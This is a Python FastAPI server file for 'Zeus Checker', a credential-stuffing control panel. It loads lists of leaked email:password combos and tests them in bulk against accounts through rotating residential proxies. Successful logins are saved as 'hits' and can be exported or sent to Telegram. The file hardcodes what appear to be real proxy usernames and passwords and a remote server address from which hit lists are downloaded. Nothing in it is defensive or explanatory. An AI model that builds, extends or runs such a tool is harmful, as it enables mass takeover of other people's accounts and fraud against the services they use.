from __future__ import annotations

import os
import time
from pathlib import Path
from typing import Any

from fastapi import FastAPI, File, Form, HTTPException, Query, UploadFile
from fastapi.responses import FileResponse, PlainTextResponse
from fastapi.staticfiles import StaticFiles
from pydantic import BaseModel

from zeus.checker import check_account, parse_combo
from zeus.proxy import parse_proxy, parse_proxy_lines
from zeus.telegram_notify import is_configured, poll_updates, register_chat, send_message

from .combo_store import (
    COMBOS_PATH,
    LARGE_COMBO_THRESHOLD,
    PROXIES_PATH,
    combo_line_count,
    copy_to_active,
    delete_combo_file,
    get_library_path,
    has_stored_combos,
    import_combo_from_url,
    list_combo_files,
    sanitize_combo_filename,
    stream_upload_to_file,
    write_text_file,
)
from .db import (
    clear_checked_combos,
    clear_hits,
    clear_valid,
    delete_hits,
    delete_valid,
    export_hits_text,
    export_valid_text,
    get_session,
    init_db,
    list_hits,
    list_valid,
    save_session,
)
from .worker import worker

STATIC_DIR = Path(__file__).resolve().parent / "static"

PROXY_PRESETS: dict[str, str] = {
    "none": "",
    "resi": "core-residential.evomi.com:1000:gulley886:tStXC3zZrqpDmVdVQdzF_country-US",
    "dc": "169.197.82.58:16963:user86020ad8:60ccd5898179",
}

VS_DEDI_BASE = "http://159.69.76.189:8812"

app = FastAPI(title="Zeus Checker")
init_db()


@app.on_event("startup")
async def setup_telegram() -> None:
    os.environ.setdefault("ZEUS_DATA_DIR", str(Path(__file__).resolve().parent.parent / "data"))
    if _bot_token_configured() and not is_configured():
        preferred = os.environ.get("TELEGRAM_CHAT_ID", "").strip() or None
        register_chat(preferred)


def _bot_token_configured() -> bool:
    return bool(os.environ.get("TELEGRAM_BOT_TOKEN", "").strip())


class DeleteHitsRequest(BaseModel):
    ids: list[int]


class SaveSessionRequest(BaseModel):
    combos: str = ""
    proxies: str = ""
    threads: int = 5
    start_line: int = 1
    rotate_proxy: bool = True
    proxy_preset: str = "none"
    combo_library: str = ""


class SmokeTestRequest(BaseModel):
    combo: str = ""
    proxy: str = ""
    rotate_proxy: bool = True


class ImportComboRequest(BaseModel):
    url: str
    filename: str = ""


class VsImportRequest(BaseModel):
    name: str


def _lines_from_text(text: str) -> list[str]:
    return [line.strip() for line in text.splitlines() if line.strip()]


async def _read_upload(file: UploadFile | None) -> str:
    if not file or not file.filename:
        return ""
    raw = await file.read()
    try:
        return raw.decode("utf-8")
    except UnicodeDecodeError:
        return raw.decode("latin-1")


def _count_nonempty_lines(text: str) -> int:
    return len(_lines_from_text(text))


def _resolve_proxy_preset(preset: str, proxies: str) -> tuple[str, str]:
    preset = (preset or "none").strip().lower()
    if preset in PROXY_PRESETS and preset != "none":
        return PROXY_PRESETS[preset], preset
    return proxies, preset if preset in PROXY_PRESETS else "custom"


def _parse_bool(value: str | bool, default: bool = True) -> bool:
    if isinstance(value, bool):
        return value
    return str(value).strip().lower() in {"1", "true", "yes", "on"}


@app.get("/")
async def index():
    return FileResponse(STATIC_DIR / "index.html")


@app.get("/api/config")
async def config() -> dict[str, Any]:
    return {
        "proxy_presets": {
            key: {
                "label": {
                    "none": "No proxy",
                    "resi": "Residential (Evomi US)",
                    "dc": "Datacenter",
                }.get(key, key),
                "rotate_default": key == "resi",
            }
            for key in PROXY_PRESETS
        },
        "vs_dedi_base": VS_DEDI_BASE,
        "vs_quick_imports": [
            {"name": "custom_backup_2026-09-21_03-45-09.txt", "label": "VS custom (non-reward)"},
            {"name": "recheck_2026-09-21_03-45-09.txt", "label": "VS recheck export"},
            {"name": "Hitlistmega.txt", "label": "VS Hitlistmega"},
            {"name": "Vs_Hits.txt", "label": "VS Hits"},
            {"name": "Blooming_Ediot.txt", "label": "VS Blooming Ediot"},
        ],
    }


@app.get("/api/session")
async def session() -> dict[str, Any]:
    data = get_session()
    data.update(worker.snapshot())
    return data


@app.post("/api/session")
async def save_session_state(body: SaveSessionRequest) -> dict[str, Any]:
    combo_text = body.combos or ""
    line_count = _count_nonempty_lines(combo_text)
    combos_stored = False

    proxies_text, preset = _resolve_proxy_preset(body.proxy_preset, body.proxies)

    if line_count > LARGE_COMBO_THRESHOLD:
        write_text_file(COMBOS_PATH, combo_text)
        combos_stored = True
        combo_text = ""
    elif line_count > 0:
        write_text_file(COMBOS_PATH, combo_text)

    if proxies_text.strip():
        write_text_file(PROXIES_PATH, proxies_text)

    save_session(
        combo_text,
        proxies_text,
        body.threads,
        combo_count=line_count or combo_line_count(),
        combos_stored=combos_stored or line_count > LARGE_COMBO_THRESHOLD,
        start_line=body.start_line,
        rotate_proxy=body.rotate_proxy,
        proxy_preset=preset,
        combo_library=body.combo_library,
    )
    return {
        "ok": True,
        "combo_count": line_count or combo_line_count(),
        "combos_stored": combos_stored or line_count > LARGE_COMBO_THRESHOLD,
    }


@app.get("/api/status")
async def status(since_log_seq: int = Query(default=0)) -> dict[str, Any]:
    data = worker.snapshot(since_log_seq=since_log_seq)
    session_data = get_session()
    data["checked_count"] = session_data["checked_count"]
    data["combo_count"] = session_data["combo_count"]
    data["combos_stored"] = session_data["combos_stored"]
    data["start_line"] = session_data["start_line"]
    data["rotate_proxy"] = session_data["rotate_proxy"]
    data["proxy_preset"] = session_data["proxy_preset"]
    data["combo_library"] = session_data["combo_library"]
    return data


@app.get("/api/combos")
async def get_combo_library() -> list[dict[str, Any]]:
    return list_combo_files()


@app.post("/api/combos/upload")
async def upload_combo_library(
    combo_file: UploadFile = File(...),
    name: str = Form(default=""),
) -> dict[str, Any]:
    if worker.is_running():
        raise HTTPException(409, "Stop the job before uploading")

    filename = name.strip() or (combo_file.filename or "upload.txt")
    safe = sanitize_combo_filename(filename)
    dest = get_library_path(safe)
    line_count = await stream_upload_to_file(combo_file, dest)
    if line_count == 0:
        raise HTTPException(400, "No valid combo lines in file")

    info = {
        "ok": True,
        "name": safe,
        "lines": line_count,
        "size": dest.stat().st_size,
    }
    return info


@app.post("/api/combos/import")
async def import_combo_url(body: ImportComboRequest) -> dict[str, Any]:
    if worker.is_running():
        raise HTTPException(409, "Stop the job before importing")

    try:
        info = await import_combo_from_url(body.url, body.filename or None)
    except ValueError as exc:
        raise HTTPException(400, str(exc)) from exc

    if info.get("lines", 0) == 0:
        raise HTTPException(400, "Imported file has no combo lines")
    return info


@app.post("/api/combos/import-vs")
async def import_vs_combo(body: VsImportRequest) -> dict[str, Any]:
    if worker.is_running():
        raise HTTPException(409, "Stop the job before importing")

    name = body.name.strip()
    if not name:
        raise HTTPException(400, "Combo name is required")

    url = f"{VS_DEDI_BASE}/api/combos/download?name={name}"
    filename = name

    try:
        info = await import_combo_from_url(url, filename)
    except ValueError as exc:
        raise HTTPException(400, str(exc)) from exc

    return info


@app.delete("/api/combos/{name}")
async def remove_combo_file(name: str) -> dict[str, bool]:
    if worker.is_running():
        raise HTTPException(409, "Stop the job before deleting combos")
    deleted = delete_combo_file(name)
    if not deleted:
        raise HTTPException(404, "Combo file not found")
    return {"ok": True}


@app.post("/api/smoke-test")
async def smoke_test(body: SmokeTestRequest | None = None) -> dict[str, Any]:
    if worker.is_running():
        raise HTTPException(409, "Stop the job before running a smoke test")

    combo_line = (body.combo if body else "") or ""
    proxy_line = (body.proxy if body else "") or ""
    rotate_proxy = body.rotate_proxy if body else True

    if not combo_line.strip():
        raise HTTPException(400, "Provide email:password for smoke test")

    parsed = parse_combo(combo_line.split("|", 1)[0])
    if not parsed:
        raise HTTPException(400, "Combo must be email:password")

    email, password = parsed
    proxy_value = None
    if proxy_line.strip():
        try:
            proxy_value = parse_proxy(proxy_line.strip())
        except ValueError as exc:
            raise HTTPException(400, str(exc)) from exc

    started = time.time()
    result = check_account(
        email,
        password,
        proxy=proxy_value,
        rotate_proxy=rotate_proxy,
        timeout=60,
    )
    elapsed_ms = int((time.time() - started) * 1000)

    return {
        "ok": result.status in {"HIT", "FAIL"},
        "status": result.status,
        "line": result.format_line(),
        "elapsed_ms": elapsed_ms,
        "data": result.to_data(),
    }


@app.post("/api/jobs/start")
async def start_job(
    combos: str = Form(default=""),
    proxies: str = Form(default=""),
    threads: str = Form(default="5"),
    start_line: str = Form(default="1"),
    rotate_proxy: str = Form(default="true"),
    proxy_preset: str = Form(default="none"),
    combo_library: str = Form(default=""),
    combo_file: UploadFile | None = File(default=None),
    proxy_file: UploadFile | None = File(default=None),
    use_stored_combos: str = Form(default="false"),
) -> dict[str, Any]:
    if worker.is_running():
        raise HTTPException(409, "A job is already running")

    try:
        thread_count = max(1, min(int(threads or "5"), 50))
    except ValueError:
        thread_count = 5

    try:
        start_line_num = max(1, int(start_line or "1"))
    except ValueError:
        start_line_num = 1

    rotate = _parse_bool(rotate_proxy, default=True)
    proxies_text, preset = _resolve_proxy_preset(proxy_preset, proxies)

    combo_lines: list[str] | None = None
    combo_file_path: Path | None = None
    combo_count = 0
    combos_stored = False
    library_name = combo_library.strip()

    if library_name:
        try:
            combo_file_path, combo_count = copy_to_active(library_name)
            combos_stored = True
        except FileNotFoundError as exc:
            raise HTTPException(404, str(exc)) from exc
    elif combo_file and combo_file.filename:
        combo_count = await stream_upload_to_file(combo_file, COMBOS_PATH)
        combo_file_path = COMBOS_PATH
        combos_stored = True
        library_name = combo_file.filename
    elif combos.strip():
        line_count = _count_nonempty_lines(combos)
        if line_count > LARGE_COMBO_THRESHOLD:
            combo_count = write_text_file(COMBOS_PATH, combos)
            combo_file_path = COMBOS_PATH
            combos_stored = True
        else:
            combo_lines = _lines_from_text(combos)
            combo_count = len(combo_lines)
            write_text_file(COMBOS_PATH, combos)
    elif use_stored_combos.lower() in {"1", "true", "yes"} or has_stored_combos():
        combo_count = combo_line_count()
        combo_file_path = COMBOS_PATH
        combos_stored = True
    else:
        raise HTTPException(400, "No combos provided — paste, upload, or select from library")

    if combo_count == 0 and combo_lines is None:
        raise HTTPException(400, "No valid combo lines found")

    proxy_lines = _lines_from_text(proxies_text)
    proxy_upload = await _read_upload(proxy_file)
    proxy_lines.extend(_lines_from_text(proxy_upload))

    if not proxy_lines and PROXIES_PATH.exists():
        proxy_lines = list(
            _lines_from_text(PROXIES_PATH.read_text(encoding="utf-8", errors="replace"))
        )

    parsed_proxies, invalid_proxies = parse_proxy_lines(proxy_lines)
    proxies_text = "\n".join(proxy_lines) if proxy_lines else proxies_text
    if proxy_lines:
        try:
            write_text_file(PROXIES_PATH, proxies_text)
        except OSError as exc:
            raise HTTPException(500, f"Cannot write proxy file: {exc}") from exc

    if invalid_proxies and not parsed_proxies:
        raise HTTPException(
            400,
            f"All {len(invalid_proxies)} proxy line(s) are invalid. "
            "Use host:port:user:pass or http://user:pass@host:port",
        )

    save_session(
        "" if combos_stored else combos,
        proxies_text,
        thread_count,
        combo_count=combo_count,
        combos_stored=combos_stored,
        start_line=start_line_num,
        rotate_proxy=rotate,
        proxy_preset=preset,
        combo_library=library_name,
    )

    result = worker.start(
        combo_lines=combo_lines,
        combo_file=combo_file_path,
        proxies=[line for line in proxy_lines if line.strip()],
        threads=thread_count,
        start_line=start_line_num,
        rotate_proxy=rotate,
    )
    if not result.get("ok"):
        error = result.get("error", "unknown")
        if error == "no_combos":
            raise HTTPException(400, "No valid combos found")
        if error == "already_running":
            raise HTTPException(409, "A job is already running")
        raise HTTPException(400, "Failed to start job")

    return {
        "ok": True,
        "status": "preparing",
        "combo_count": combo_count,
        **worker.snapshot(),
    }


@app.post("/api/jobs/stop")
async def stop_job() -> dict[str, bool]:
    worker.stop()
    return {"ok": True}


@app.post("/api/progress/reset")
async def reset_progress() -> dict[str, int]:
    if worker.is_running():
        raise HTTPException(409, "Stop the job before resetting progress")
    cleared = clear_checked_combos()
    return {"cleared": cleared}


@app.get("/api/hits")
async def get_hits() -> list[dict[str, Any]]:
    return list_hits()


@app.get("/api/hits/export")
async def export_hits() -> PlainTextResponse:
    return PlainTextResponse(export_hits_text(), media_type="text/plain")


@app.post("/api/hits/delete")
async def remove_hits(body: DeleteHitsRequest) -> dict[str, int]:
    deleted = delete_hits(body.ids)
    return {"deleted": deleted}


@app.post("/api/hits/clear")
async def remove_all_hits() -> dict[str, int]:
    deleted = clear_hits()
    return {"deleted": deleted}


@app.get("/api/valid")
async def get_valid() -> list[dict[str, Any]]:
    return list_valid()


@app.get("/api/valid/export")
async def export_valid() -> PlainTextResponse:
    return PlainTextResponse(export_valid_text(), media_type="text/plain")


@app.post("/api/valid/delete")
async def remove_valid(body: DeleteHitsRequest) -> dict[str, int]:
    deleted = delete_valid(body.ids)
    return {"deleted": deleted}


@app.post("/api/valid/clear")
async def remove_all_valid() -> dict[str, int]:
    deleted = clear_valid()
    return {"deleted": deleted}


@app.get("/api/telegram/status")
async def telegram_status() -> dict[str, Any]:
    return {
        "configured": is_configured(),
        "has_token": _bot_token_configured(),
        "pending_chats": poll_updates(),
    }


@app.post("/api/telegram/register")
async def telegram_register() -> dict[str, Any]:
    preferred = os.environ.get("TELEGRAM_CHAT_ID", "").strip() or None
    ok, detail = register_chat(preferred)
    if not ok:
        raise HTTPException(400, detail)
    return {"ok": True, "chat_id": detail}


@app.post("/api/telegram/test")
async def telegram_test() -> dict[str, Any]:
    ok, detail = send_message("Zeus Checker — Telegram notifications are working.")
    return {"ok": ok, "detail": detail}


app.mount("/static", StaticFiles(directory=STATIC_DIR), name="static")
